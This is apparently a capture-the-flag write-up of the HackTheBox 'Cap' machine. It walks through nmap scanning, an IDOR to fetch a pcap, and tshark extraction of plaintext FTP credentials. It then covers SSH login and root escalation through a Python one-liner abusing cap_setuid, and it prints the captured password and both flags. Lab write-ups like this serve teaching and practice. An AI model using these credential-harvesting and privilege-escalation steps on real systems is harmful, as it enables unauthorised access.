---
layout: default
title: "HackTheBox — Cap Walkthrough (10.10.10.245)"
---

# ./ HackTheBox/Cap:~# 

> **Machine:** Cap (10.10.10.245)
> **Difficulty:** Easy
> **Techniques:** PCAP Analysis, IDOR, Linux Capabilities

---

### [~] Enumeration:~#

The first step is always to see what the target is running.  
Using **Nmap** with scripts and version detection:

```bash
nmap -sC -sV -oN nmap_scan.txt 10.10.10.245
```

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn (http-server-header: gunicorn)
```

So we have:
- **FTP** (21)  
- **SSH** (22)  
- **HTTP** (80)  

The web service claims to be a **Security Dashboard**. Suspicious and interesting 😎

---

[!] Web_Analysis:~#

Browsing to `http://10.10.10.245/` shows a **Security Dashboard**. By manipulating the URL, I found an IDOR vulnerability in the /data/ directory. Changing the index allowed me to download a sensitive .pcap file.

```bash
wget http://10.10.10.245/data/1.pcap -O cap.pcap
```

---

I opened the file with `tshark` to look at FTP credentials:

```bash
tshark -r cap.pcap -Y "ftp.request.command == \"USER\" or ftp.request.command == \"PASS\""        -T fields -e ftp.request.command -e ftp.request.arg
```

**Output:**
```
USER nathan
PASS Buck3tH4TF0RM3!
```
 
---

[#] Gaining_Access:~#

The credentials worked for both FTP and SSH so I opted for SSH to get a stable TTY shell and got the user flag

```bash
ssh nathan@10.10.10.245
```


```bash
cat user.txt
```

**Flag:**  
```
6e89061b7afba09dfa066e55e390c53d
```

---

## ⬆ Privilege Escalation

Checking for misconfigured Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

**Output:**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Since Python has cap_setuid, we can force the process to run as root:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Now that we have root, let’s grab the final flag:

```bash
cat /root/root.txt
```

**Flag:**  
```
69d7ea1977e866c3e9ba8c5ff6abe8f0
```

---

## 📝 Lessons Learned

- `.pcap` files can leak **sensitive credentials** (FTP cleartext login in this case).  
- **Linux capabilities** can be as dangerous as `SUID` binaries if misconfigured.  
- Always check binaries with `getcap -r / 2>/dev/null`.

---

It’s a perfect beginner-friendly machine that teaches:
- Traffic capture analysis
- Credential harvesting
- Misconfigured binary exploitation

Happy hacking! 
